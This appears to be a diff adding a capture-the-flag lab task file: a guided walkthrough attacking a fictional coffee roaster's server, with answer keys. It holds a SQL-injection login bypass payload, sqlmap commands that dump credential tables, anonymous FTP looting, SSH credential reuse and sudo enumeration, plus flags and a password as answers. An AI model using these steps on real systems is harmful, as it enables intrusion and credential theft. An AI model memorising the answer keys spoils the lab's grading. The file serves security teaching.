@@ -1,0 +1,365 @@
+[
+  {
+    "id": 1000,
+    "text": "BrewMaster Coffee Co.: The Rushed Portal (Easy)",
+    "type": "page",
+    "children": [
+      {
+        "id": 9357,
+        "text": "Lab Overview",
+        "type": "task",
+        "Question_Title": "Lab Overview",
+        "Question": "<h2>BrewMaster Coffee Co.: The Rushed Portal</h2>\n<p style=\"font-size:12pt;\"><strong>Format:</strong> Guided walkthrough · 12 tasks · <strong>Difficulty:</strong> Easy · <strong>Time:</strong> 1 hours</p>\n<h3>Before you start</h3>\n<ol>\n<li style=\"font-size:12pt;\">Start the lab and connect your <strong>Kali</strong> attacker box.</li>\n<li style=\"font-size:12pt;\">Your target, the <strong>Roastery</strong> server, is in <code>172.16.20.0/24</code> Lan.</li>\n</ol>\n<h3>Storyline</h3>\n<p style=\"font-size:12pt;\"><strong>BrewMaster Coffee Co.</strong> is a small independent coffee roaster in Norfolk, VA. To let baristas check the weekly roast schedule from home, the owner rushed out a <em>staff web portal</em> and set up an <em>FTP file drop</em> - then went back to roasting beans. Nobody hardened anything. You have been hired as a junior penetration tester to find out how far an attacker could get.</p>\n<h3>Scope</h3>\n<ul>\n<li style=\"font-size:12pt;\"><strong>In scope:</strong> the single target host in <code>172.16.20.0/24</code>.</li>\n<li style=\"font-size:12pt;\"><strong>Out of scope:</strong> denial-of-service and any destructive action.</li>\n</ul>\n<h3>What you will practice</h3>\n<ul>\n<li style=\"font-size:12pt;\">Port scanning and service/version detection</li>\n<li style=\"font-size:12pt;\">Enumerating an anonymous FTP service</li>\n<li style=\"font-size:12pt;\">Web content discovery</li>\n<li style=\"font-size:12pt;\">SQL injection - authentication bypass, straight from the browser</li>\n<li style=\"font-size:12pt;\">Credential reuse to gain an SSH foothold</li>\n<li style=\"font-size:12pt;\">Linux privilege escalation via a sudo misconfiguration (GTFOBins)</li>\n</ul>\n<h3>Flags</h3>\n<p style=\"font-size:12pt;\">There are two flags. Both use the format <code>BrewMaster{...}</code>:</p>\n<ul>\n<li style=\"font-size:12pt;\"><code>user.txt</code> - in the foothold user home directory.</li>\n<li style=\"font-size:12pt;\"><code>root.txt</code> - in <code>/root</code>.</li>\n</ul>\n<h3>Scoring</h3>\n<p style=\"font-size:12pt;\">11 graded tasks · <strong>150 points total</strong>. Hints carry small penalties.</p>\n<p style=\"font-size:12pt;\"><strong>Let's Start !</strong></p>",
+        "Answer": "[]",
+        "Camouflage": "[]",
+        "Category": "27",
+        "Task_Type": "5",
+        "Score": "0",
+        "Lose": "0",
+        "PartialCredit": 0,
+        "Visibility": 1,
+        "Hints": [],
+        "Choices": []
+      },
+      {
+        "id": 9358,
+        "text": "Scanning the Target",
+        "type": "task",
+        "Question_Title": "Scanning the Target",
+        "Question": "<p style=\"font-size:12pt;\">Every engagement starts by finding out which doors are open. We scan the target for listening TCP ports and ask nmap to identify the software behind each one.</p>\n<h3>Background</h3>\n<p style=\"font-size:12pt;\">A <strong>port scan</strong> tells you which network services a host exposes. Version detection then fingerprints each service, which guides everything you do next.</p>\n<p style=\"font-size:12pt;\"><strong>Goal:</strong> Discover the open TCP ports on the target.</p>\n<p style=\"font-size:12pt;\"><strong>Tool: <code>nmap</code></strong> - the standard network scanner. The <code>-sV</code> flag adds service/version detection.</p>\n<h3>Step-by-Step</h3>\n<ol>\n<li style=\"font-size:12pt;\">Run a version scan against the target:</li>\n</ol>\n<pre class=\"language-bash\"><code>┌──(kali㉿kali)-[~]\n└─$ nmap -sV 172.16.20.10</code></pre>\n<p style=\"font-size:12pt;\">Observed result:</p>\n<pre class=\"language-bash\"><code>PORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.5\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.17 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))\nService Info: Host: BrewMaster; OS: Linux</code></pre>\n<h4>Command notes</h4>\n<ul>\n<li style=\"font-size:12pt;\"><code>nmap</code> - network mapper / port scanner.</li>\n<li style=\"font-size:12pt;\"><code>-sV</code> - probe open ports to determine service and version.</li>\n<li style=\"font-size:12pt;\">Tip: add <code>-p-</code> to scan all 65535 ports; here the top-ports scan already finds them.</li>\n</ul>\n<p style=\"font-size:12pt;\"><strong>How many TCP ports are open on the target?</strong></p>\n<p style=\"font-size:12pt;\"><em>Answer format:</em> a single number, e.g. <code>2</code></p>",
+        "Answer": "[{\"value\":\"3\",\"__isValid\":true,\"__tagId\":\"1a08e962-1d9f-4f4a-8f3d-3cc2a4d6ef26\"}]",
+        "Camouflage": "[]",
+        "Category": "35",
+        "Task_Type": "1",
+        "Score": "10",
+        "Lose": "0",
+        "PartialCredit": 0,
+        "Visibility": 1,
+        "Hints": [
+          {
+            "id": 10104,
+            "text": "Run nmap -sV against the target and count the lines that say \"open\".",
+            "penalty": 3
+          }
+        ],
+        "Choices": []
+      },
+      {
+        "id": 9359,
+        "text": "Fingerprinting the Web Server",
+        "type": "task",
+        "Question_Title": "Fingerprinting the Web Server",
+        "Question": "<p style=\"font-size:12pt;\">Port 80 is open, so a web server is running. Before browsing the site, capture the web server software and version - it is the baseline for any web assessment.</p><h3>Background</h3><p style=\"font-size:12pt;\">Most web servers reveal themselves in the <code>Server:</code> HTTP response header. Reading it is the quickest fingerprint you can take.</p><p style=\"font-size:12pt;\"><strong>Goal:</strong> Read the HTTP <code>Server</code> banner on port 80.</p><p style=\"font-size:12pt;\"><strong>Tool: <code>curl</code></strong> - a command-line HTTP client. Used here to make a HEAD request and read only the response headers.</p><h3>Step-by-Step</h3><ol><li style=\"font-size:12pt;\">Request only the headers with a HEAD request:</li></ol><pre class=\"language-bash\"><code>┌──(kali㉿kali)-[~]\n└─$ curl -sI http://172.16.20.10/</code></pre><p style=\"font-size:12pt;\">Observed result (relevant line):</p><pre class=\"language-bash\"><code>Server: Apache/2.4.52 (Ubuntu)</code></pre><h4>Command notes</h4><ul><li style=\"font-size:12pt;\"><code>-s</code> - silent (hide the progress meter).</li><li style=\"font-size:12pt;\"><code>-I</code> - send a HEAD request; we only want headers.</li><li style=\"font-size:12pt;\">The same version also appears in the <code>nmap -sV</code> output from the previous task.</li></ul><p style=\"font-size:12pt;\"><strong>What is the web server software and version?</strong></p><p style=\"font-size:12pt;\"><em>Answer format:</em> <code>Software/X.Y.Z (Ubuntu)</code></p>",
+        "Answer": "[{\"value\": \"Apache/2.4.52 (Ubuntu)\"}, {\"value\": \"Apache/2.4.52\"}, {\"value\": \"2.4.52\"}]",
+        "Camouflage": "[]",
+        "Category": "79",
+        "Task_Type": "2",
+        "Score": "10",
+        "Lose": "0",
+        "PartialCredit": 0,
+        "Visibility": 1,
+        "Hints": [
+          {
+            "id": 10105,
+            "text": "Look at the Server: header from curl -sI, or the port 80 line in nmap -sV.",
+            "penalty": 3
+          }
+        ],
+        "Choices": []
+      },
+      {
+        "id": 9360,
+        "text": "Probing Anonymous FTP",
+        "type": "task",
+        "Question_Title": "Probing Anonymous FTP",
+        "Question": "<p style=\"font-size:12pt;\">The scan showed FTP on port 21. Many rushed setups leave <strong>anonymous</strong> FTP enabled, which lets anyone log in without a real account. Let us check.</p><h3>Background</h3><p style=\"font-size:12pt;\"><strong>Anonymous FTP</strong> accepts the username <code>anonymous</code> (or <code>ftp</code>) with any password. If enabled, its files are readable by anyone on the network.</p><p style=\"font-size:12pt;\"><strong>Goal:</strong> Log in anonymously and list what is shared.</p><p style=\"font-size:12pt;\"><strong>Tool: <code>ftp</code> / <code>curl</code></strong> - either the interactive FTP client or curl can browse an FTP share.</p><h3>Step-by-Step</h3><ol><li style=\"font-size:12pt;\">List the anonymous share (curl is quickest):</li></ol><pre class=\"language-bash\"><code>┌──(kali㉿kali)-[~]\n└─$ curl -s ftp://172.16.20.10/</code></pre><p style=\"font-size:12pt;\">Or interactively - log in with username <code>anonymous</code> and a blank password:</p><pre class=\"language-bash\"><code>┌──(kali㉿kali)-[~]\n└─$ ftp 172.16.20.10</code></pre><p style=\"font-size:12pt;\">Observed result: a single readable file is present:</p><pre class=\"language-bash\"><code>staff-memo.txt</code></pre><h4>Command notes</h4><ul><li style=\"font-size:12pt;\">In the interactive client, type <code>ls</code> to list and <code>get staff-memo.txt</code> to download.</li><li style=\"font-size:12pt;\">The banner also greets you with \"BrewMaster Coffee Co. FTP\".</li></ul><p style=\"font-size:12pt;\"><strong>What is the filename available on the anonymous FTP share?</strong></p><p style=\"font-size:12pt;\"><em>Answer format:</em> <code>name.ext</code></p>",
+        "Answer": "[{\"value\": \"staff-memo.txt\"}]",
+        "Camouflage": "[]",
+        "Category": "11",
+        "Task_Type": "1",
+        "Score": "10",
+        "Lose": "0",
+        "PartialCredit": 0,
+        "Visibility": 1,
+        "Hints": [
+          {
+            "id": 10106,
+            "text": "Log in with the username anonymous and any password, then list the directory.",
+            "penalty": 3
+          }
+        ],
+        "Choices": []
+      },
+      {
+        "id": 9361,
+        "text": "Reading the Leaked Memo",
+        "type": "task",
+        "Question_Title": "Reading the Leaked Memo",
+        "Question": "<p style=\"font-size:12pt;\">Download and read the memo. Internal documents often leak exactly the details an attacker needs - usernames, internal paths, and hints about weak spots.</p><p style=\"font-size:12pt;\"><strong>Goal:</strong> Read the memo and find the staff member who has server access.</p><p style=\"font-size:12pt;\"><strong>Tool: <code>curl</code> / <code>cat</code></strong> - fetch and print the file.</p><h3>Step-by-Step</h3><ol><li style=\"font-size:12pt;\">Print the memo:</li></ol><pre class=\"language-bash\"><code>┌──(kali㉿kali)-[~]\n└─$ curl -s ftp://172.16.20.10/staff-memo.txt</code></pre><p style=\"font-size:12pt;\">Observed result (excerpt):</p><pre class=\"language-bash\"><code>Barista usernames are first-initial + last name (e.g. \"jrivera\" for Jordan Rivera).\nJordan (jrivera) also handles maintenance and has access to the server itself.\n...the portal login was thrown together in a rush and nobody has checked whether\nit handles typed-in input safely yet.</code></pre><h4>Why this matters</h4><p style=\"font-size:12pt;\">The memo hands us three gifts: a real username (<code>jrivera</code>), the fact that this user can reach the server, and a strong hint that the login page does not safely handle typed-in input (a classic sign of SQL injection).</p><p style=\"font-size:12pt;\"><strong>According to the memo, which username has access to the server?</strong></p><p style=\"font-size:12pt;\"><em>Answer format:</em> a single username, e.g. <code>bsmith</code></p>",
+        "Answer": "[{\"value\": \"jrivera\"}]",
+        "Camouflage": "[]",
+        "Category": "11",
+        "Task_Type": "1",
+        "Score": "10",
+        "Lose": "0",
+        "PartialCredit": 0,
+        "Visibility": 1,
+        "Hints": [
+          {
+            "id": 10107,
+            "text": "The memo names the person who handles maintenance and has server access.",
+            "penalty": 3
+          }
+        ],
+        "Choices": []
+      },
+      {
+        "id": 9362,
+        "text": "Discovering the Staff Portal",
+        "type": "task",
+        "Question_Title": "Discovering the Staff Portal",
+        "Question": "<p style=\"font-size:12pt;\">The memo mentioned a staff portal. Web servers often hide such pages from the front page but still list them in <code>robots.txt</code> or expose them to directory brute-forcing.</p><h3>Background</h3><p style=\"font-size:12pt;\"><code>robots.txt</code> tells search engines which paths to avoid - which conveniently points attackers straight at the \"hidden\" areas.</p><p style=\"font-size:12pt;\"><strong>Goal:</strong> Find the hidden staff portal path.</p><p style=\"font-size:12pt;\"><strong>Tool: <code>curl</code> / <code>gobuster</code></strong> - curl reads robots.txt; gobuster brute-forces directory names from a wordlist.</p><h3>Step-by-Step</h3><ol><li style=\"font-size:12pt;\">Read robots.txt:</li></ol><pre class=\"language-bash\"><code>┌──(kali㉿kali)-[~]\n└─$ curl -s http://172.16.20.10/robots.txt</code></pre><p style=\"font-size:12pt;\">Observed result:</p><pre class=\"language-bash\"><code>User-agent: *\nDisallow: /portal/</code></pre><ol><li style=\"font-size:12pt;\">(Optional) Confirm with a directory scan:</li></ol><pre class=\"language-bash\"><code>┌──(kali㉿kali)-[~]\n└─$ gobuster dir -u http://172.16.20.10/ -w /usr/share/wordlists/dirb/common.txt</code></pre><h4>Command notes</h4><ul><li style=\"font-size:12pt;\"><code>gobuster dir</code> - directory brute-force mode.</li><li style=\"font-size:12pt;\"><code>-w</code> - wordlist of names to try.</li></ul><p style=\"font-size:12pt;\"><strong>What hidden path is revealed by robots.txt?</strong></p><p style=\"font-size:12pt;\"><em>Answer format:</em> <code>/path/</code></p>",
+        "Answer": "[{\"value\": \"/portal/\"}, {\"value\": \"/portal\"}, {\"value\": \"portal\"}]",
+        "Camouflage": "[]",
+        "Category": "5",
+        "Task_Type": "2",
+        "Score": "10",
+        "Lose": "0",
+        "PartialCredit": 0,
+        "Visibility": 1,
+        "Hints": [
+          {
+            "id": 10108,
+            "text": "robots.txt has a single Disallow line - that is the path.",
+            "penalty": 3
+          }
+        ],
+        "Choices": []
+      },
+      {
+        "id": 9363,
+        "text": "Identifying the Login Flaw",
+        "type": "task",
+        "Question_Title": "Identifying the Login Flaw",
+        "Question": "<p style=\"font-size:12pt;\">Open the portal in a browser at <code>http://172.16.20.10/portal/</code>. You are greeted by a staff login form. The memo warned that its input handling is unsafe - let us identify the exact weakness.</p><h3>Background</h3><p style=\"font-size:12pt;\"><strong>SQL injection (SQLi)</strong> happens when a web app builds a database query by gluing your input directly into the SQL text. A single quote <code>'</code> can break out of the intended string and change what the query does.</p><p style=\"font-size:12pt;\"><strong>Goal:</strong> Identify the vulnerability class affecting the login.</p><p style=\"font-size:12pt;\"><strong>Tool:</strong> your browser - just type a test character into the field.</p><h3>Step-by-Step</h3><ol><li style=\"font-size:12pt;\">In the <em>Username</em> field, type a single quote and submit:</li></ol><pre class=\"language-bash\"><code>Username:  '\nPassword:  anything</code></pre><p style=\"font-size:12pt;\">The login misbehaves (it does not simply say \"invalid\") because your quote is being inserted straight into a SQL statement that looks like:</p><pre class=\"language-bash\"><code>SELECT id, username, role FROM staff WHERE username='' AND password=''</code></pre><p style=\"font-size:12pt;\">Because the input is not sanitised, we can rewrite the query logic - the definition of SQL injection.</p><p style=\"font-size:12pt;\"><strong>What type of web vulnerability does the login form suffer from?</strong></p><p style=\"font-size:12pt;\"><em>Answer format:</em> the vulnerability name, e.g. <code>Cross-Site Scripting</code></p>",
+        "Answer": "[{\"value\": \"SQL Injection\"}, {\"value\": \"SQLi\"}, {\"value\": \"sql injection\"}, {\"value\": \"sqli\"}]",
+        "Camouflage": "[]",
+        "Category": "33",
+        "Task_Type": "2",
+        "Score": "10",
+        "Lose": "0",
+        "PartialCredit": 0,
+        "Visibility": 1,
+        "Hints": [
+          {
+            "id": 10109,
+            "text": "A single quote breaking a login query is the signature of this injection flaw.",
+            "penalty": 3
+          }
+        ],
+        "Choices": []
+      },
+      {
+        "id": 9364,
+        "text": "Bypassing the Login (SQL Injection)",
+        "type": "task",
+        "Question_Title": "Bypassing the Login (SQL Injection)",
+        "Question": "<p style=\"font-size:12pt;\">Now weaponise the injection. The easiest and most common trick is an <strong>authentication bypass</strong>: comment out the password check so the query returns a valid user.</p><h3>Background</h3><p style=\"font-size:12pt;\">In SQL, <code>-- </code> (two dashes and a space) starts a comment. If we close the username string and comment out the rest, the password condition disappears.</p><p style=\"font-size:12pt;\"><strong>Goal:</strong> Log in without valid credentials.</p><p style=\"font-size:12pt;\"><strong>Tool:</strong> the browser first (simplest), then optionally <code>sqlmap</code>.</p><h3>Step-by-Step (browser - do this first)</h3><ol><li style=\"font-size:12pt;\">In the <em>Username</em> field type the payload below, put anything in <em>Password</em>, and submit:</li></ol><pre class=\"language-bash\"><code>Username:  admin' -- -\nPassword:  x</code></pre><p style=\"font-size:12pt;\">The query becomes <code>... WHERE username='admin' -- -' AND password='x'</code>. Everything after <code>-- </code> is ignored, so it matches the admin row and logs you in. You land on the staff dashboard, which lists all staff accounts.</p><h3>Optional - dump the same data with sqlmap</h3><p style=\"font-size:12pt;\"><strong>Tool: <code>sqlmap</code></strong> - automates detection and exploitation of SQLi. Use it only after you understand the manual method:</p><pre class=\"language-bash\"><code>┌──(kali㉿kali)-[~]\n└─$ sqlmap -u \"http://172.16.20.10/portal/index.php\" --data=\"username=a&amp;password=a\" --batch --dump -T staff</code></pre><h4>Command notes</h4><ul><li style=\"font-size:12pt;\"><code>--data</code> - the POST body; sqlmap injects into these parameters.</li><li style=\"font-size:12pt;\"><code>--dump -T staff</code> - extract the <code>staff</code> table.</li></ul><p style=\"font-size:12pt;\"><strong>After bypassing the login, how many staff accounts are listed on the dashboard?</strong></p><p style=\"font-size:12pt;\"><em>Answer format:</em> a single number, e.g. <code>2</code></p>",
+        "Answer": "[{\"value\": \"4\"}]",
+        "Camouflage": "[]",
+        "Category": "33",
+        "Task_Type": "1",
+        "Score": "15",
+        "Lose": "0",
+        "PartialCredit": 0,
+        "Visibility": 1,
+        "Hints": [
+          {
+            "id": 10110,
+            "text": "Try username  admin' -- -  with any password, then count the rows in the staff table.",
+            "penalty": 5
+          }
+        ],
+        "Choices": []
+      },
+      {
+        "id": 9599,
+        "text": "Enumerating the Database with sqlmap",
+        "type": "task",
+        "Question_Title": "Enumerating the Database with sqlmap",
+        "Question": "<p style=\"font-size:12pt;\">You bypassed the login by hand, but the very same injection lets you read the <em>entire</em> database. Because the login returns a clean success/failure response (a redirect when the query matches, an error when it does not), it is a perfect true/false oracle for automated blind extraction. Enumerating the database is the natural next move for a thorough attacker.</p><h3>Background</h3><p style=\"font-size:12pt;\">When results are not printed on the page, you cannot simply UNION-select data onto the screen. Instead you ask the database yes/no questions and read the answer from the app's behaviour (login vs. error). Doing this by hand is slow, so we let <strong>sqlmap</strong> automate it.</p><p style=\"font-size:12pt;\"><strong>Goal:</strong> Confirm the injection with sqlmap and read the DBMS version.</p><p style=\"font-size:12pt;\"><strong>Tool: <code>sqlmap</code></strong> – automates detection and exploitation of SQL injection.</p><h3>Step-by-Step</h3><p style=\"font-size:12pt;\">Point sqlmap at the login POST request and target the <code>username</code> field:</p><pre class=\"language-bash\"><code>┌──(kali㉿kali)-[~]\n└─$ sqlmap -u \"http://172.16.20.10/portal/index.php\" --data=\"username=admin&amp;password=x\" -p username --batch --banner</code></pre><p style=\"font-size:12pt;\"><strong>Observed output (trimmed):</strong></p><pre class=\"language-bash\"><code>POST parameter 'username' is vulnerable.\nType: boolean-based blind ; time-based blind ; UNION query (3 columns)\nback-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)\nback-end DBMS operating system: Linux Ubuntu 22.04 (jammy)\nbanner: '10.6.23-MariaDB-0ubuntu0.22.04.1'</code></pre><h4>Command notes</h4><ul><li style=\"font-size:12pt;\"><code>--data</code> – the POST body; sqlmap injects into these parameters.</li><li style=\"font-size:12pt;\"><code>-p username</code> – focus testing on the username field.</li><li style=\"font-size:12pt;\"><code>--batch</code> – accept all defaults (non-interactive).</li><li style=\"font-size:12pt;\"><code>--banner</code> – read the DBMS version banner.</li></ul><p style=\"font-size:12pt;\"><strong>Manual check (same oracle):</strong> a <em>true</em> condition logs you in (HTTP 302), a <em>false</em> one does not (HTTP 200) – e.g. <code>username=admin' AND @@version LIKE '10.6%'-- -</code> returns 302.</p><p style=\"font-size:12pt;\"><strong>Question:</strong> What is the back-end DBMS version reported by sqlmap?</p><p style=\"font-size:12pt;\"><strong>Answer Format:</strong> the version string, e.g. <code>X.Y.Z-Name-...</code></p>",
+        "Answer": "[{\"value\": \"10.6.23-MariaDB-0ubuntu0.22.04.1\"}, {\"value\": \"10.6.23-MariaDB\"}, {\"value\": \"10.6.23\"}, {\"value\": \"MariaDB 10.6.23\"}]",
+        "Camouflage": "[]",
+        "Category": "33",
+        "Task_Type": "2",
+        "Score": "10",
+        "Lose": "0",
+        "PartialCredit": 0,
+        "Visibility": 1,
+        "Hints": [
+          {
+            "id": 10290,
+            "text": "sqlmap --banner prints the exact version; or test @@version LIKE '10.6%' through the login's true/false response.",
+            "penalty": 3
+          }
+        ],
+        "Choices": []
+      },
+      {
+        "id": 9600,
+        "text": "Enumerating the Accessible Databases",
+        "type": "task",
+        "Question_Title": "Enumerating the Accessible Databases",
+        "Question": "<p style=\"font-size:12pt;\">With the injection confirmed, list the databases the web application's database account can reach.</p><p style=\"font-size:12pt;\"><strong>Goal:</strong> Enumerate the databases visible through the injection.</p><p style=\"font-size:12pt;\"><strong>Tool: <code>sqlmap</code></strong>.</p><h3>Step-by-Step</h3><pre class=\"language-bash\"><code>┌──(kali㉿kali)-[~]\n└─$ sqlmap -u \"http://172.16.20.10/portal/index.php\" --data=\"username=admin&amp;password=x\" -p username --batch --dbs</code></pre><p style=\"font-size:12pt;\"><strong>Observed output (trimmed):</strong></p><pre class=\"language-bash\"><code>fetching database names\navailable databases [2]:\n[*] brewmaster\n[*] information_schema</code></pre><p style=\"font-size:12pt;\">Two databases are visible to the app's account: <code>brewmaster</code> (the application data) and the always-present <code>information_schema</code>. A limited account like this is normal, but it can still read everything inside <code>brewmaster</code>.</p><p style=\"font-size:12pt;\"><strong>Question:</strong> How many databases are accessible to the application's database account?</p><p style=\"font-size:12pt;\"><strong>Answer Format:</strong> a single number</p>",
+        "Answer": "[{\"value\": \"2\"}]",
+        "Camouflage": "[]",
+        "Category": "33",
+        "Task_Type": "1",
+        "Score": "10",
+        "Lose": "0",
+        "PartialCredit": 0,
+        "Visibility": 1,
+        "Hints": [
+          {
+            "id": 10291,
+            "text": "sqlmap --dbs prints 'available databases [N]'.",
+            "penalty": 3
+          }
+        ],
+        "Choices": []
+      },
+      {
+        "id": 9601,
+        "text": "Mapping the staff Table",
+        "type": "task",
+        "Question_Title": "Mapping the staff Table",
+        "Question": "<p style=\"font-size:12pt;\">Drill into <code>brewmaster</code>: list its tables, then the columns of the table that holds credentials.</p><p style=\"font-size:12pt;\"><strong>Goal:</strong> Map the structure of the staff table before dumping it.</p><p style=\"font-size:12pt;\"><strong>Tool: <code>sqlmap</code></strong>.</p><h3>Step 1 – list the tables</h3><pre class=\"language-bash\"><code>┌──(kali㉿kali)-[~]\n└─$ sqlmap -u \"http://172.16.20.10/portal/index.php\" --data=\"username=admin&amp;password=x\" -p username --batch -D brewmaster --tables</code></pre><p style=\"font-size:12pt;\"><strong>Observed output (trimmed):</strong></p><pre class=\"language-bash\"><code>Database: brewmaster\n[1 table]\n+-------+\n| staff |\n+-------+</code></pre><h3>Step 2 – list the columns of staff</h3><pre class=\"language-bash\"><code>┌──(kali㉿kali)-[~]\n└─$ sqlmap -u \"http://172.16.20.10/portal/index.php\" --data=\"username=admin&amp;password=x\" -p username --batch -D brewmaster -T staff --columns</code></pre><p style=\"font-size:12pt;\"><strong>Observed output (trimmed):</strong></p><pre class=\"language-bash\"><code>Database: brewmaster  Table: staff  [4 columns]\n| id       | int(11)      |\n| username | varchar(50)  |\n| password | varchar(100) |\n| role     | varchar(50)  |</code></pre><p style=\"font-size:12pt;\">Four columns. From here, <code>--dump -T staff</code> would extract every account and its clear-text password (the same data the dashboard leaked after the auth bypass) – confirming the impact from a second angle.</p><p style=\"font-size:12pt;\"><strong>Question:</strong> How many columns does the staff table have?</p><p style=\"font-size:12pt;\"><strong>Answer Format:</strong> a single number</p>",
+        "Answer": "[{\"value\": \"4\"}]",
+        "Camouflage": "[]",
+        "Category": "33",
+        "Task_Type": "1",
+        "Score": "10",
+        "Lose": "0",
+        "PartialCredit": 0,
+        "Visibility": 1,
+        "Hints": [
+          {
+            "id": 10292,
+            "text": "sqlmap -D brewmaster -T staff --columns lists them; count the rows.",
+            "penalty": 3
+          }
+        ],
+        "Choices": []
+      },
+      {
+        "id": 9365,
+        "text": "Extracting jrivera's Credentials",
+        "type": "task",
+        "Question_Title": "Extracting jrivera's Credentials",
+        "Question": "<p style=\"font-size:12pt;\">The dashboard has a serious flaw of its own: it displays every account's password in clear text (sensitive data exposure). Combined with the memo, this hands us a way onto the server.</p><p style=\"font-size:12pt;\"><strong>Goal:</strong> Recover the password for the user with server access (<code>jrivera</code>).</p><p style=\"font-size:12pt;\"><strong>Tool:</strong> the dashboard you just reached (or the sqlmap dump).</p><h3>Step-by-Step</h3><ol><li style=\"font-size:12pt;\">On the dashboard, read the row for <code>jrivera</code> and note the password shown in the Password column.</li></ol><p style=\"font-size:12pt;\">Observed result:</p><pre class=\"language-bash\"><code>User      Password         Role\njrivera   *************    Barista (server access)</code></pre><p style=\"font-size:12pt;\">There is also an \"IT note\" panel confirming that the portal and server accounts share the same password - a textbook <strong>password reuse</strong> problem.</p><p style=\"font-size:12pt;\"><strong>What is jrivera's password?</strong></p><p style=\"font-size:12pt;\"><em>Answer format:</em> the password string, e.g. <code>Word@1234</code></p>",
+        "Answer": "[{\"value\": \"Espresso@2024\"}]",
+        "Camouflage": "[]",
+        "Category": "25",
+        "Task_Type": "1",
+        "Score": "15",
+        "Lose": "0",
+        "PartialCredit": 0,
+        "Visibility": 1,
+        "Hints": [
+          {
+            "id": 10111,
+            "text": "The dashboard prints every account's password. Read jrivera's row.",
+            "penalty": 5
+          }
+        ],
+        "Choices": []
+      },
+      {
+        "id": 9366,
+        "text": "Foothold: SSH and the User Flag",
+        "type": "task",
+        "Question_Title": "Foothold: SSH and the User Flag",
+        "Question": "<p style=\"font-size:12pt;\">The memo said jrivera can reach the server, and the dashboard leaked the password. Because the same password is reused for the system account, we can log straight in over SSH.</p>\n<h3>Background</h3>\n<p style=\"font-size:12pt;\"><strong>Credential reuse</strong> - people reuse one password across systems. A password found in a web app frequently unlocks SSH, and vice-versa.</p>\n<p style=\"font-size:12pt;\"><strong>Goal:</strong> Get an interactive shell and read the user flag.</p>\n<p style=\"font-size:12pt;\"><strong>Tool: <code>ssh</code></strong> - the secure shell client for remote login.</p>\n<h3>Step-by-Step</h3>\n<ol>\n<li style=\"font-size:12pt;\">Log in as jrivera (enter the recovered password when prompted):</li>\n</ol>\n<pre class=\"language-bash\"><code>┌──(kali㉿kali)-[~]\n└─$ ssh jrivera@172.16.20.10</code></pre>\n<ol>\n<li style=\"font-size:12pt;\">Confirm who you are and read the flag:</li>\n</ol>\n<pre class=\"language-bash\"><code>┌──(kali㉿kali)-[~]\n└─$ id</code></pre>\n<pre class=\"language-bash\"><code>┌──(kali㉿kali)-[~]\n└─$ cat user.txt</code></pre>\n<p style=\"font-size:12pt;\">Observed result:</p>\n<pre class=\"language-bash\"><code>uid=1001(jrivera) gid=1001(jrivera) groups=1001(jrivera)\nBrewMaster{83eced446d97a258af14ff56}</code></pre>\n<p style=\"font-size:12pt;\"><strong>Submit the user flag from jrivera's home directory.</strong></p>\n<p style=\"font-size:12pt;\"><em>Answer format:</em> <code>BrewMaster{...}</code></p>",
+        "Answer": "[{\"value\":\"BrewMaster{83eced446d97a258af14ff56}\",\"__isValid\":true,\"__tagId\":\"09a6db53-53cc-43d4-9007-7c34110a6f76\"}]",
+        "Camouflage": "[]",
+        "Category": "12",
+        "Task_Type": "1",
+        "Score": "20",
+        "Lose": "0",
+        "PartialCredit": 0,
+        "Visibility": 1,
+        "Hints": [
+          {
+            "id": 10112,
+            "text": "Reuse the portal password: ssh jrivera@172.16.20.10 , then cat user.txt.",
+            "penalty": 5
+          }
+        ],
+        "Choices": []
+      },
+      {
+        "id": 9367,
+        "text": "Enumerating Sudo Rights",
+        "type": "task",
+        "Question_Title": "Enumerating Sudo Rights",
+        "Question": "<p style=\"font-size:12pt;\">You have a foothold, but only as a normal user. The first thing to check for privilege escalation is what commands you are allowed to run as root.</p>\n<h3>Background</h3>\n<p style=\"font-size:12pt;\"><code>sudo -l</code> lists the commands the current user may run through sudo. A single over-permitted binary is often enough to become root.</p>\n<p style=\"font-size:12pt;\"><strong>Goal:</strong> Find what jrivera can run as root without a password.</p>\n<p style=\"font-size:12pt;\"><strong>Tool: <code>sudo</code></strong> - runs commands as another user; <code>-l</code> lists your privileges.</p>\n<h3>Step-by-Step</h3>\n<ol>\n<li style=\"font-size:12pt;\">List your sudo rights:</li>\n</ol>\n<pre class=\"language-bash\"><code>┌──(kali㉿kali)-[~]\n└─$ sudo -l</code></pre>\n<p style=\"font-size:12pt;\">Observed result:</p>\n<pre class=\"language-bash\"><code>User jrivera may run the following commands on BrewMaster:\n    (root) NOPASSWD: /usr/bin/find</code></pre>\n<p style=\"font-size:12pt;\"><strong>Which binary can jrivera run as root without a password?</strong></p>\n<p style=\"font-size:12pt;\"><em>Answer format:</em> full path, e.g. <code>/usr/bin/xxx</code></p>",
+        "Answer": "[{\"value\":\"/usr/bin/find\",\"__isValid\":true,\"__tagId\":\"de9b4a26-cf9d-4f53-98aa-0db10c4fe514\"},{\"value\":\"find\",\"__isValid\":true,\"__tagId\":\"9570f755-b51b-4968-ab1d-b64de550835b\"}]",
+        "Camouflage": "[]",
+        "Category": "13",
+        "Task_Type": "2",
+        "Score": "15",
+        "Lose": "0",
+        "PartialCredit": 0,
+        "Visibility": 1,
+        "Hints": [
+          {
+            "id": 10113,
+            "text": "Run sudo -l - it prints exactly one NOPASSWD binary.",
+            "penalty": 3
+          }
+        ],
+        "Choices": []
+      },
+      {
+        "id": 9368,
+        "text": "Privilege Escalation: Root Flag",
+        "type": "task",
+        "Question_Title": "Privilege Escalation: Root Flag",
